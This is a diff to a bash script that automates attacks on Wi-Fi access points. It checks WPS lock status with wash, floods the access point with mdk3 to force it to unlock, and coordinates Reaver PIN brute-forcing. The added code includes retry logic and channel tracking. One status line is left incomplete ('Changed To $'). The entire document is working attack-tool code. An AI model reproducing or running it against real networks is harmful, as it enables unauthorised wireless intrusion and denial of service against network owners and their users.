@@ -345,6 +345,7 @@ checkLockStatus(){
 	local CMD_LOCK_STATUS;
 	local WASH_OUTPUT;
 	local CHECK_LOCK_STATUS;
+	local WASH_ATTEMPT;
 
 	echoBlue "Checking AP Lock Status......";
 
@@ -359,8 +360,13 @@ checkLockStatus(){
 	eval $CMD_LOCK_STATUS | {
 		while read -r WASH_OUTPUT; do
 			if [[ $(echo "$WASH_OUTPUT" | grep -ic "$AP_BSSID") -eq 1 ]]; then
-				if [[ $(awk '{ print $5 }' <<< $WASH_OUTPUT) == "Yes" ]]; then
+				echo "$(awk '{ print $5 }' <<< $WASH_OUTPUT)";
+				if [[ "$(awk '{ print $5 }' <<< $WASH_OUTPUT)" == "Yes" ]]; then
 					echo "AP_CHECK_STATUS_LOCKED" > $CHECK_LOCK_STATUS;
+					if [[ "$(awk '{ print $2 }' <<< $WASH_OUTPUT)" != "$AP_CHANNEL" ]]; then
+						echoBlue "AP Channel Changed To $";
+						AP_CHANNEL="$(awk '{ print $2 }' <<< $WASH_OUTPUT)";
+					fi
 					break;
 				else
 					echo "AP_CHECK_STATUS_UNLOCKED" > $CHECK_LOCK_STATUS;
@@ -374,20 +380,27 @@ checkLockStatus(){
 		echo $(date +"%d/%m/%Y %H:%M:%S $(cat $CHECK_LOCK_STATUS)") >> $STATUS_FILE
 	}
 
-	case $(echo $CHECK_LOCK_STATUS) in
+	case $(cat $CHECK_LOCK_STATUS) in
 		["AP_CHECK_STATUS_LOCKED"]* )
 			AP_LOCK="Yes";;
 		["AP_CHECK_STATUS_UNLOCKED"]* )
 			AP_LOCK="No";;
 		["AP_NOT_FOUND"]* )
-			CHECK_APLOCK_TIMEOUT=$((CHECK_APLOCK_TIMEOUT+5));
-			checkLockStatus;;
+			WASH_ATTEMPT=$((WASH_ATTEMPT+1));
+			AP_LOCK="";
+
+			if [[ $WASH_ATTEMPT -le $MAX_WASH_ATTEMPT ]]; then
+				$(rm $CHECK_LOCK_STATUS);
+				AP_LOCK="";
+				checkLockStatus;
+			fi
+			;;
 	esac
 
 	$(rm $CHECK_LOCK_STATUS);
 
 	case $AP_STATUS_FROM in
-		1)
+		1) ### Check Lock Status Request By MDK3
 			if [[ $(cat $MDK3_STATUS) -eq $MAX_CLIENTS ]]; then
 				$(rm $MDK3_STATUS);
 			else
@@ -397,11 +410,13 @@ checkLockStatus(){
 				fi
 			fi
 			;;
-		2)
+		2) ### Check Lock Status Request By Reaver
 			if [[ "$AP_LOCK" == "Yes" ]]; then
 				echoRed "AP Is Locked......";
-			else
+			elif [[ "$AP_LOCK" == "No" ]]; then
 				echoGreen "AP Is Not Locked......";
+			else
+				echoRed "AP Not Found......";
 			fi
 			;;
 	esac
@@ -413,6 +428,8 @@ unlockAP(){
 	local MDK3_OUTPUT;
 	local CLIENT_COUNT;
 	local LOOP_TARGET=0;
+
+	echoOrange "Trying To Unlock AP......";
 
 	if [[ ! -f $STATUS_FILE ]]; then
 		touch $STATUS_FILE;
@@ -442,7 +459,8 @@ unlockAP(){
 
 		echo $(date +"%d/%m/%Y %H:%M:%S MDK3_FLOOD_ATTACK_$LOOP_TARGET") >> $STATUS_FILE
 
-		$(kill "$MDK3PID");
+		$(killall -I mdk3);
+		#$(kill "$MDK3PID");
 	}
 	AP_STATUS_FROM=1;
 	checkLockStatus;
@@ -813,8 +831,8 @@ while true; do
 			checkLockStatus;
 
 			if [[ "$AP_LOCK" == "Yes" ]]; then
-				echoRed "AP Locked......";
-				echoOrange "Trying To Unlock AP......";
+#				echoRed "AP Locked......";
+#				echoOrange "Trying To Unlock AP......";
 				unlockAP;
 
 				if [[ "$AP_LOCK" == "Yes" ]]; then
